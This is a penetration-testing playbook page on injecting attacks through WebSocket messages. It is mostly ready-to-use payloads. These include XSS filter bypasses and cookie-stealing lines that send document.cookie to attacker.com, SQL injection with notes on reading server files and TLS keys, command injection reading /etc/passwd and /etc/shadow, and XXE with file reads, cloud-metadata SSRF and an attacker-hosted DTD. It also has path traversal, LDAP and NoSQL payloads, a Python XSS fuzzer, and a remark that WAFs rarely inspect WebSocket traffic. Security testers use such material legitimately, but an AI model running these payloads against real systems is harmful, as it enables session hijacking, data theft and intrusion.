# WebSocket Message Injection (XSS / SQLi / Cmd / XXE / Path / NoSQL / LDAP)

## When this applies

- WebSocket carries JSON / text messages from the client to the server.
- Server reflects messages into the DOM, parses them in SQL/NoSQL queries, or passes them to shells / XML parsers.
- All standard injection classes apply through the WebSocket channel — same payloads as REST.

## Technique

Send injection payloads through an active WebSocket connection. Observe responses for reflection, errors, or out-of-band callbacks. Use wscat / websocat / Burp Repeater for the WebSocket session.

## Steps

### XSS payloads

**Basic:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<input autofocus onfocus=alert(1)>
```

**Obfuscated (filter bypass):**
```html
<!-- Case variation -->
<img src=x oNeRrOr=alert(1)>
<img src=x OnErRoR=alert(1)>
<svg OnLoAd=alert(1)>
<SCRIPT>alert(1)</SCRIPT>

<!-- Backtick syntax -->
<img src=x onerror=alert`1`>
<img src=x onerror=alert`document.domain`>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="alert(1)">

<!-- Alternative tags -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>

<!-- Event handlers -->
<img src=x onload=alert(1)>
<img src=x onmouseover=alert(1)>
<form><button formaction=javascript:alert(1)>X</button></form>
```

**XSS encoding bypass:**
```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
<script>alert(1)</script>

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

**Cookie theft:**
```html
<img src=x onerror='fetch("https://attacker.com?c="+document.cookie)'>
<script>fetch("https://attacker.com",{method:"POST",body:document.cookie})</script>
<img src=x onerror='new Image().src="https://attacker.com?c="+document.cookie'>
```

### SQL injection

**Boolean-Based:**
```sql
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
admin' #
') OR ('1'='1
```

> **Boolean WS-blind extraction recipe**: When the handler responds with a single-bit oracle (`"Ticket Exists"` / `"Invalid"`, JSON `{"ok": true/false}`, frame length differential), it's the same shape as HTTP boolean-blind SQLi — bisect characters with `1 OR (mid(...,N,1)>'X')`-style payloads. Speak WebSocket frames instead of HTTP. Common ports for unprotected internal WS handlers: 9091, 9001, 6789, 8080+. WAFs almost never inspect WebSocket payloads, and sqlmap doesn't speak WS — these endpoints frequently survive HTTP-side hardening untouched. Use Python `websockets` + a tight char-bisection loop, or Burp's WebSocket Repeater + Intruder.
>
> **`LOAD_FILE` arbitrary read when MariaDB user has FILE priv.** Probe `SELECT user, file_priv FROM mysql.user` first. If `Y`, a UNION with `LOAD_FILE('/etc/passwd')` returns the file content regardless of column-count constraints — wrap binary configs in `CONVERT(LOAD_FILE(...) USING utf8)` to print cleanly. On OpenBSD targets the highest-value reads are `/etc/relayd.conf` (hidden vhosts), `/etc/httpd.conf`, `/var/unbound/etc/tls/control.{key,pem}` (DNS-poisoning primitive). See [../../../../server-side/reference/scenarios/path-traversal/target-files.md](../../../../server-side/reference/scenarios/path-traversal/target-files.md) for the full OpenBSD high-value list and [../../../../infrastructure/reference/dns-quickstart.md](../../../../infrastructure/reference/dns-quickstart.md) for the unbound-control exfil chain.

**UNION-Based:**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**Time-Based Blind:**
```sql
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Error-Based:**
```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

### Command injection

**Unix/Linux:**
```bash
; ls -la
| whoami
|| cat /etc/passwd
& id
&& uname -a
`whoami`
$(id)
; cat /etc/passwd
| cat /etc/shadow
```

**Windows:**
```cmd
& dir
&& ipconfig
| whoami
|| net user
```

**Time-based detection:**
```bash
; sleep 10
| ping -c 10 127.0.0.1
|| timeout 10
& ping -n 10 127.0.0.1
```

### XXE payloads

**File retrieval:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

**SSRF via XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

**Out-of-Band XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>
```

### Path traversal

```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/images/../../../etc/passwd
/etc/passwd%00.png
```

### Wildcard / parameter injection

When WebSocket messages contain ID parameters, try replacing specific IDs with wildcards or broad values:

```json
{"userId":"*","projectId":"*"}
{"userId":"","projectId":""}
{"userId":null,"projectId":null}
```

**Impact**: If the server doesn't validate ownership, wildcard values may return data for all users. Test real-time notification and dashboard WebSocket endpoints especially.

### LDAP injection

```
*
*)(&
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
*)(objectClass=*
```

### NoSQL injection

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
```

### XSS fuzzer (Python)

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<img src=x oNeRrOr=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "';alert(1);//",
    "\"><script>alert(1)</script>",
]

async def fuzz_xss(uri):
    async with websockets.connect(uri) as ws:
        for payload in xss_payloads:
            message = json.dumps({"message": payload})
            await ws.send(message)
            print(f"[*] Sent: {payload}")

            try:
                response = await asyncio.wait_for(ws.recv(), timeout=2.0)
                print(f"[+] Response: {response[:100]}\n")
            except asyncio.TimeoutError:
                print("[!] Connection closed\n")
                break

            await asyncio.sleep(1)

asyncio.run(fuzz_xss("wss://target.com/chat"))
```

## Verifying success

- Reflected XSS: payload renders in the receiving client's DOM (alert fires).
- SQLi: time-based delay observed; UNION returns extra columns.
- Command injection: out-of-band callback (DNS / HTTP) received.
- Wildcard injection: the server returns more rows than the user owns.

## Common pitfalls

- Frames may be size-limited by some servers — split large payloads.
- Some apps reject non-JSON frames — wrap payload as `{"message": "..."}`.
- Server-to-server-to-client flows mean reflection happens in another user's session — confirm reflection by opening a second client.

## Tools

- wscat, websocat
- Burp Suite WebSocket Repeater
- Python `websockets` library
- SocketSleuth (Burp BApp)
